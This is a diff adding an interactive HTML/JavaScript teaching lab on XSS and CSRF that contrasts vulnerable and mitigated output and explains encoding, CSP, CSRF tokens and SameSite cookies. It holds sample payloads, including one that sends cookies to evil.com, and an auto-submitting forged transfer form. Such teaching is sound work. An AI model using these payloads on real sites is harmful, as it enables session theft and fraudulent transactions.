@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS & CSRF Security Lab</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: #15161e;
+    color: #c5c8c6;
+    font-family: Georgia, 'Times New Roman', serif;
+    min-height: 100vh;
+    padding: 24px 16px;
+  }
+
+  .wrap { max-width: 720px; margin: 0 auto; }
+
+  .tag {
+    font-size: 10px; letter-spacing: 3px; text-transform: uppercase;
+    color: #cc6666; font-family: monospace; margin-bottom: 6px;
+  }
+
+  h1 { font-size: 26px; font-weight: 700; color: #e8e8e8; line-height: 1.2; }
+  h1 span { color: #6a7080; font-weight: 400; }
+
+  h2 {
+    font-size: 20px; font-weight: 600; color: #e8e8e8;
+    margin: 0 0 16px; padding-bottom: 12px; border-bottom: 1px solid #2a2d3a;
+  }
+
+  /* Tabs */
+  .tabs { display: flex; gap: 4px; margin: 24px 0; overflow-x: auto; padding-bottom: 2px; }
+  .tab-btn {
+    padding: 8px 12px; border-radius: 6px; border: 1px solid #2a2d3a;
+    background: transparent; color: #6a7080; font-size: 11px; font-weight: 600;
+    cursor: pointer; white-space: nowrap; font-family: monospace; transition: all .15s;
+  }
+  .tab-btn.active-xss { border-color: #cc6666; background: rgba(204,102,102,.1); color: #cc6666; }
+  .tab-btn.active-csrf { border-color: #81a2be; background: rgba(129,162,190,.1); color: #81a2be; }
+
+  .lesson { display: none; }
+  .lesson.active { display: block; }
+
+  .desc { color: #8b93a8; font-size: 14px; line-height: 1.7; margin-bottom: 16px; }
+
+  .scenario {
+    background: #1a1c24; border: 1px solid #f0c674; border-radius: 6px;
+    padding: 12px; margin-bottom: 16px; font-size: 13px; color: #f0c674;
+    line-height: 1.6; font-family: monospace;
+  }
+
+  .label {
+    font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px;
+    color: #6a7080; margin-bottom: 6px; font-family: monospace;
+  }
+
+  /* Payload buttons */
+  .payload-btns { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 12px; }
+  .payload-btn {
+    background: #23252f; border: 1px solid #2a2d3a; border-radius: 4px;
+    color: #81a2be; font-size: 11px; padding: 5px 10px; cursor: pointer;
+    font-family: monospace; transition: all .15s;
+  }
+  .payload-btn:hover, .payload-btn.sel { border-color: #81a2be; background: #2a3040; }
+
+  textarea {
+    width: 100%; background: #13141b; color: #c5c8c6; border: 1px solid #2a2d3a;
+    border-radius: 6px; padding: 12px; font-size: 13px; font-family: monospace;
+    resize: vertical; outline: none; margin-bottom: 16px;
+  }
+  textarea:focus { border-color: #4a4f5e; }
+
+  /* Mode toggle */
+  .mode-row { display: flex; gap: 8px; margin-bottom: 16px; }
+  .mode-btn {
+    flex: 1; padding: 10px 0; border-radius: 6px; border: 1px solid #2a2d3a;
+    background: #1a1c24; color: #6a7080; font-size: 12px; font-weight: 600;
+    cursor: pointer; font-family: monospace; transition: all .15s;
+  }
+  .mode-btn.vuln-on { border-color: #cc6666; background: rgba(204,102,102,.12); color: #cc6666; }
+  .mode-btn.safe-on { border-color: #81c784; background: rgba(129,199,132,.12); color: #81c784; }
+
+  /* Output box */
+  .output-box {
+    background: #1d1f27; border: 1px solid #2a2d3a; border-radius: 6px;
+    padding: 12px; margin-bottom: 16px;
+  }
+  .output-box pre {
+    margin: 0; font-size: 12px; line-height: 1.5; color: #c5c8c6;
+    font-family: monospace; white-space: pre-wrap; word-break: break-word;
+  }
+  .verdict {
+    margin-top: 10px; padding: 8px 10px; border-radius: 4px;
+    font-size: 12px; font-family: monospace;
+  }
+  .verdict.danger { background: rgba(204,102,102,.1); border: 1px solid rgba(204,102,102,.3); color: #cc6666; }
+  .verdict.safe   { background: rgba(129,199,132,.1); border: 1px solid rgba(129,199,132,.3); color: #81c784; }
+
+  /* Code block */
+  .code-wrap { margin-bottom: 12px; position: relative; }
+  .code-wrap pre {
+    background: #13141b; border: 1px solid #2a2d3a; border-radius: 6px;
+    padding: 14px; font-size: 12px; line-height: 1.6; overflow-x: auto;
+    color: #a9b1c6; font-family: monospace; white-space: pre-wrap; word-break: break-word;
+  }
+  .copy-btn {
+    position: absolute; top: 8px; right: 8px; background: #23252f;
+    border: 1px solid #2a2d3a; border-radius: 4px; color: #6a7080;
+    font-size: 10px; padding: 3px 8px; cursor: pointer; font-family: monospace;
+  }
+  .copy-btn.ok { background: #2d4a3e; color: #81c784; }
+
+  /* Mitigation toggle */
+  .mit-toggle {
+    background: #23252f; border: 1px solid #2a2d3a; border-radius: 6px;
+    color: #b294bb; font-size: 12px; padding: 10px 16px; cursor: pointer;
+    width: 100%; font-weight: 600; font-family: monospace; margin-top: 4px;
+  }
+  .mit-panel {
+    margin-top: 12px; padding: 16px; background: #1a1c24;
+    border-radius: 6px; border: 1px solid #2a2d3a; display: none;
+  }
+  .mit-panel.open { display: block; }
+  .mit-panel p { color: #8b93a8; font-size: 13px; line-height: 1.7; margin-bottom: 12px; }
+
+  /* CSRF stepper */
+  .step-row { display: flex; gap: 6px; margin-bottom: 12px; }
+  .step-btn {
+    flex: 1; padding: 10px 4px; border-radius: 6px; border: 1px solid #2a2d3a;
+    background: #1a1c24; color: #6a7080; font-size: 18px; cursor: pointer;
+    transition: all .15s;
+  }
+  .step-btn.on { border-color: #f0c674; background: rgba(240,198,116,.15); color: #f0c674; }
+  .step-btn.past { background: rgba(240,198,116,.05); }
+  .step-detail {
+    background: #1a1c24; border: 1px solid #2a2d3a; border-radius: 6px; padding: 14px;
+    margin-bottom: 20px;
+  }
+  .step-detail .step-title {
+    color: #f0c674; font-size: 13px; font-weight: 600; margin-bottom: 4px; font-family: monospace;
+  }
+  .step-detail .step-text { color: #8b93a8; font-size: 13px; line-height: 1.6; }
+
+  .footer {
+    margin-top: 32px; padding-top: 16px; border-top: 1px solid #2a2d3a;
+    font-size: 11px; color: #4a4f5e; font-family: monospace; line-height: 1.6;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">Security Lab</div>
+  <h1>XSS &amp; CSRF <span>Attack → Defend</span></h1>
+
+  <div class="tabs" id="tabs"></div>
+
+  <div id="lesson-container"></div>
+
+  <div class="footer">
+    Key takeaways: XSS = untrusted data in HTML context → encode output.
+    CSRF = forged cross-origin requests → tokens + SameSite cookies.
+    Defense in depth: layer multiple mitigations.
+  </div>
+</div>
+
+<script>
+const esc = s => s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#039;");
+
+const LESSONS = [
+  {
+    key:"xss-reflected", group:"xss", label:"Reflected XSS", title:"Reflected XSS",
+    desc:"User input is reflected directly into the page without sanitization. The attacker crafts a malicious URL that, when clicked by a victim, executes script in their browser session.",
+    scenario:"A search page echoes back the user's query. Try injecting a script tag.",
+    payloads:[
+      {label:"Basic script tag", value:'<script>alert("XSS")<\/script>'},
+      {label:"Image onerror", value:'<img src=x onerror=alert("XSS")>'},
+      {label:"SVG onload", value:'<svg onload=alert("XSS")>'},
+    ],
+    vuln: i => '<div class="search-results"><p>Results for: '+i+'</p><p>No results found.</p></div>',
+    safe: i => '<div class="search-results"><p>Results for: '+esc(i)+'</p><p>No results found.</p></div>',
+    mitigation:"HTML-encode all user input before inserting into the DOM. Replace <, >, \", ', & with their HTML entity equivalents. Use textContent instead of innerHTML where possible.",
+    mitCode:`// VULNERABLE — raw interpolation
+resultsDiv.innerHTML = "Results for: " + userInput;
+
+// SAFE — encode first
+function escapeHTML(str) {
+  return str
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+resultsDiv.innerHTML = "Results for: " + escapeHTML(userInput);
+
+// SAFEST — use textContent (no parsing at all)
+resultsDiv.textContent = "Results for: " + userInput;`,
+  },
+  {
+    key:"xss-stored", group:"xss", label:"Stored XSS", title:"Stored XSS",
+    desc:"Malicious input is persisted (e.g. in a database) and rendered to every user who views that content. More dangerous than reflected because the attacker doesn't need to trick users into clicking a link.",
+    scenario:"A comment section stores and displays user comments. Inject a payload that would execute for every visitor.",
+    payloads:[
+      {label:"Cookie theft", value:'<script>document.location="https://evil.com?c="+document.cookie<\/script>'},
+      {label:"Event handler", value:'<div onmouseover=alert("XSS")>Hover me!</div>'},
+      {label:"Anchor injection", value:'<a href="javascript:alert(1)">Click me</a>'},
+    ],
+    vuln: i => '<div class="comment"><strong>user42:</strong> '+i+'</div>',
+    safe: i => '<div class="comment"><strong>user42:</strong> '+esc(i)+'</div>',
+    mitigation:"Same output encoding as reflected XSS, plus a Content Security Policy (CSP) header to block inline scripts even if encoding is missed. Sanitize on output, not just on input.",
+    mitCode:`// Server-side: set CSP header
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+// This blocks ALL inline scripts — even if an XSS payload
+// gets stored, the browser refuses to execute it.
+
+// Defense in depth: encode on output AND use CSP.
+// Never rely on input validation alone.`,
+  },
+  {
+    key:"xss-dom", group:"xss", label:"DOM XSS", title:"DOM-based XSS",
+    desc:"The vulnerability lives entirely in client-side JS. The server never sees the payload — it flows from a source (like location.hash) to a sink (like innerHTML) purely in the browser.",
+    scenario:"A page reads from the URL hash and injects it into the DOM. The server is never involved.",
+    payloads:[
+      {label:"Image onerror", value:'<img src=x onerror=alert("DOM-XSS")>'},
+      {label:"Iframe inject", value:'<iframe src="javascript:alert(1)">'},
+    ],
+    vuln: i => '<div class="dom-content"><p>Page section:</p>'+i+'</div>',
+    safe: i => '<div class="dom-content"><p>Page section:</p>'+esc(i)+'</div>',
+    mitigation:"Avoid dangerous sinks (innerHTML, document.write, eval). Use textContent or createElement. If you must accept HTML, sanitize with a library like DOMPurify.",
+    mitCode:`// VULNERABLE — hash straight into innerHTML
+const section = location.hash.slice(1);
+document.getElementById("content").innerHTML = section;
+
+// SAFE — use textContent
+document.getElementById("content").textContent = section;
+
+// SAFE — use DOMPurify if HTML rendering is needed
+import DOMPurify from "dompurify";
+document.getElementById("content").innerHTML =
+  DOMPurify.sanitize(section);`,
+  },
+  {
+    key:"csrf-basic", group:"csrf", label:"CSRF: Forms", title:"CSRF: Forged Form Submission",
+    desc:"The attacker hosts a page with a hidden form that auto-submits to the target site. If the victim is logged in, their browser attaches cookies automatically, and the server processes the request as legitimate.",
+    attackCode:`<!-- Attacker's malicious page at evil.com -->
+<html>
+<body onload="document.forms[0].submit()">
+  <form action="https://bank.com/transfer" method="POST">
+    <input type="hidden" name="to" value="attacker" />
+    <input type="hidden" name="amount" value="10000" />
+  </form>
+</body>
+</html>`,
+    steps:[
+      {icon:"🏦", label:"Victim logged in", detail:"Session cookie is set in the browser for bank.com."},
+      {icon:"🎣", label:"Visits attacker page", detail:"Attacker tricks the victim into visiting evil.com (phishing email, ad, etc)."},
+      {icon:"📤", label:"Hidden form submits", detail:"evil.com has a <form> targeting bank.com/transfer that auto-submits on page load."},
+      {icon:"🍪", label:"Cookie attached", detail:"Browser automatically sends bank.com's session cookie with the cross-origin POST."},
+      {icon:"💸", label:"Transfer executes", detail:"bank.com sees a valid session and processes the $10,000 transfer to the attacker."},
+    ],
+    mitigation:"Use anti-CSRF tokens: a random, per-session value embedded in every form that the server validates on submission. The attacker can't read the token from another origin (same-origin policy).",
+    mitCode:`// Server generates a random token per session
+app.get("/transfer", (req, res) => {
+  const token = crypto.randomBytes(32).toString("hex");
+  req.session.csrfToken = token;
+  res.render("transfer", { csrfToken: token });
+});
+
+// Token embedded as a hidden field
+<form action="/transfer" method="POST">
+  <input type="hidden" name="_csrf" value="{{csrfToken}}" />
+  <input name="to" />
+  <input name="amount" />
+  <button>Transfer</button>
+</form>
+
+// Server validates the token on POST
+app.post("/transfer", (req, res) => {
+  if (req.body._csrf !== req.session.csrfToken) {
+    return res.status(403).send("Invalid CSRF token");
+  }
+  // proceed with transfer
+});`,
+  },
+  {
+    key:"csrf-cookie", group:"csrf", label:"CSRF: Cookies", title:"CSRF: SameSite Cookie Defense",
+    desc:"Modern browsers support the SameSite cookie attribute, which controls when cookies are sent in cross-site requests. This is a powerful, low-effort defense layer.",
+    attackCode:`Cross-origin POST from attacker.com to bank.com:
+
+SameSite=None   → Cookie IS sent       → CSRF succeeds
+SameSite=Lax    → Cookie NOT sent (POST)→ CSRF blocked
+                   (still sent on GET navigations)
+SameSite=Strict → Cookie NEVER sent     → CSRF blocked
+                   (breaks legitimate cross-site links)`,
+    steps:[
+      {icon:"🍪", label:"SameSite=None", detail:"Cross-origin POST includes the session cookie. CSRF succeeds. This is the old default."},
+      {icon:"🛡", label:"SameSite=Lax", detail:"Browser withholds cookie on cross-origin POST. CSRF blocked. Safe GET navigations still work."},
+      {icon:"🔒", label:"SameSite=Strict", detail:"Cookie never sent cross-site, even on GET. Maximum safety but can break inbound links from other sites."},
+    ],
+    mitigation:"Set SameSite=Lax on session cookies. It blocks cross-origin POSTs while allowing normal link navigation. Combine with CSRF tokens for defense in depth.",
+    mitCode:`// Express session cookie
+app.use(session({
+  name: "session",
+  secret: process.env.SESSION_SECRET,
+  cookie: {
+    httpOnly: true,     // JS can't read the cookie
+    secure: true,       // HTTPS only
+    sameSite: "lax",    // block cross-origin POST
+    maxAge: 3600000,    // 1 hour
+  }
+}));
+
+// Rails
+Rails.application.config.action_dispatch
+  .cookies_same_site_protection = :lax
+
+// Defense in depth: SameSite + CSRF tokens + Origin header check`,
+  },
+];
+
+// State
+let activeKey = "xss-reflected";
+let modes = {};       // key -> "vulnerable"|"safe"
+let inputs = {};      // key -> string
+let mitOpen = {};     // key -> bool
+let csrfStep = {};    // key -> number
+
+LESSONS.forEach(l => {
+  modes[l.key] = "vulnerable";
+  inputs[l.key] = "";
+  mitOpen[l.key] = false;
+  csrfStep[l.key] = 0;
+});
+
+// Render tabs
+function renderTabs() {
+  const el = document.getElementById("tabs");
+  el.innerHTML = LESSONS.map(l => {
+    const active = l.key === activeKey;
+    const cls = active ? (l.group === "xss" ? "active-xss" : "active-csrf") : "";
+    return `<button class="tab-btn ${cls}" data-key="${l.key}">${l.label}</button>`;
+  }).join("");
+  el.querySelectorAll(".tab-btn").forEach(btn => {
+    btn.onclick = () => { activeKey = btn.dataset.key; render(); };
+  });
+}
+
+function makeCodeBlock(code, title) {
+  const id = "cb-" + Math.random().toString(36).slice(2,8);
+  return `
+    ${title ? `<div class="label">${title}</div>` : ""}
+    <div class="code-wrap">
+      <pre>${esc(code)}</pre>
+      <button class="copy-btn" id="${id}">Copy</button>
+    </div>`;
+}
+
+function renderXSS(l) {
+  const input = inputs[l.key];
+  const mode = modes[l.key];
+  const output = mode === "vulnerable" ? l.vuln(input) : l.safe(input);
+  const hasActive = /<script|onerror|onload|onmouseover|javascript:/i.test(output);
+  const isVuln = mode === "vulnerable";
+
+  let verdictHtml = "";
+  if (input.length > 0) {
+    if (isVuln && hasActive) {
+      verdictHtml = `<div class="verdict danger">⚠ Active tags detected — a real browser would execute this payload</div>`;
+    } else if (!isVuln) {
+      verdictHtml = `<div class="verdict safe">✓ All tags escaped — browser renders as harmless text</div>`;
+    }
+  }
+
+  return `
+    <p class="desc">${l.desc}</p>
+    <div class="scenario">⚡ ${l.scenario}</div>
+
+    <div class="label">Try a payload</div>
+    <div class="payload-btns" id="payloads-${l.key}">
+      ${l.payloads.map((p,i) => `<button class="payload-btn ${input===p.value?"sel":""}" data-idx="${i}">${p.label}</button>`).join("")}
+    </div>
+
+    <div class="label">Your input</div>
+    <textarea id="input-${l.key}" rows="3" placeholder="Type or select a payload...">${esc(input)}</textarea>
+
+    <div class="mode-row">
+      <button class="mode-btn ${isVuln?"vuln-on":""}" id="btn-vuln-${l.key}">🔓 Vulnerable</button>
+      <button class="mode-btn ${!isVuln?"safe-on":""}" id="btn-safe-${l.key}">🔒 Mitigated</button>
+    </div>
+
+    <div class="label">${isVuln ? "⚠ Server HTML output (vulnerable)" : "✓ Server HTML output (mitigated)"}</div>
+    <div class="output-box">
+      <pre>${esc(output)}</pre>
+      ${verdictHtml}
+    </div>
+
+    <button class="mit-toggle" id="mit-btn-${l.key}">${mitOpen[l.key]?"▾ Hide":"▸ Show"} Mitigation Details</button>
+    <div class="mit-panel ${mitOpen[l.key]?"open":""}" id="mit-panel-${l.key}">
+      <p>${l.mitigation}</p>
+      ${makeCodeBlock(l.mitCode, "Implementation")}
+    </div>`;
+}
+
+function renderCSRF(l) {
+  const step = csrfStep[l.key];
+
+  return `
+    <p class="desc">${l.desc}</p>
+
+    <div class="label">Attack flow — click to step through</div>
+    <div class="step-row" id="steps-${l.key}">
+      ${l.steps.map((s,i) => `<button class="step-btn ${i===step?"on":i<step?"past":""}" data-idx="${i}">${s.icon}</button>`).join("")}
+    </div>
+    <div class="step-detail">
+      <div class="step-title">Step ${step+1}: ${l.steps[step].label}</div>
+      <div class="step-text">${l.steps[step].detail}</div>
+    </div>
+
+    ${makeCodeBlock(l.attackCode, "Attack scenario")}
+
+    <button class="mit-toggle" id="mit-btn-${l.key}">${mitOpen[l.key]?"▾ Hide":"▸ Show"} Mitigation Details</button>
+    <div class="mit-panel ${mitOpen[l.key]?"open":""}" id="mit-panel-${l.key}">
+      <p>${l.mitigation}</p>
+      ${makeCodeBlock(l.mitCode, "Implementation")}
+    </div>`;
+}
+
+function render() {
+  renderTabs();
+  const container = document.getElementById("lesson-container");
+  const l = LESSONS.find(x => x.key === activeKey);
+
+  if (!l) return;
+
+  const titleHtml = `<h2>${l.title}</h2>`;
+  const bodyHtml = l.group === "xss" ? renderXSS(l) : renderCSRF(l);
+  container.innerHTML = titleHtml + bodyHtml;
+
+  // Wire up events
+  if (l.group === "xss") {
+    // Payload buttons
+    container.querySelectorAll(`#payloads-${l.key} .payload-btn`).forEach(btn => {
+      btn.onclick = () => {
+        inputs[l.key] = l.payloads[parseInt(btn.dataset.idx)].value;
+        render();
+      };
+    });
+    // Textarea
+    const ta = document.getElementById(`input-${l.key}`);
+    ta.oninput = () => { inputs[l.key] = ta.value; render(); };
+    // Restore cursor position after render
+    ta.focus(); ta.selectionStart = ta.selectionEnd = ta.value.length;
+    // Mode buttons
+    document.getElementById(`btn-vuln-${l.key}`).onclick = () => { modes[l.key] = "vulnerable"; render(); };
+    document.getElementById(`btn-safe-${l.key}`).onclick = () => { modes[l.key] = "safe"; render(); };
+  } else {
+    // CSRF step buttons
+    container.querySelectorAll(`#steps-${l.key} .step-btn`).forEach(btn => {
+      btn.onclick = () => { csrfStep[l.key] = parseInt(btn.dataset.idx); render(); };
+    });
+  }
+
+  // Mitigation toggle
+  document.getElementById(`mit-btn-${l.key}`).onclick = () => { mitOpen[l.key] = !mitOpen[l.key]; render(); };
+
+  // Copy buttons
+  container.querySelectorAll(".copy-btn").forEach(btn => {
+    btn.onclick = () => {
+      const text = btn.parentElement.querySelector("pre").textContent;
+      navigator.clipboard.writeText(text);
+      btn.textContent = "Copied";
+      btn.classList.add("ok");
+      setTimeout(() => { btn.textContent = "Copy"; btn.classList.remove("ok"); }, 1500);
+    };
+  });
+}
+
+render();
+</script>
+</body>
+</html>
